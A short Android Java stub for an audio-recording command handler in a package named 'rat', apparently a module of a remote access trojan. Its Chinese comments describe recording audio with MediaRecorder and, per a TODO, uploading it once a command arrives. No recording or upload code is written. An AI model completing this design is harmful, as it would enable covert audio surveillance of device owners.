package com.vendor.rat.control.handler;

import android.util.Log;

import com.google.gson.JsonObject;

/**
 * 录音处理器 (模块 06)
 *
 * 使用 MediaRecorder 录制音频
 * 参数: AAC 编码, 44.1kHz, 96kbps
 */
public class AudioRecordHandler {

    private static final String TAG = "AudioRecordHandler";

    public void handle(JsonObject command) {
        Log.d(TAG, "Audio record command received");
        // TODO: 启动 MediaRecorder 录音，完成后上传
    }
}
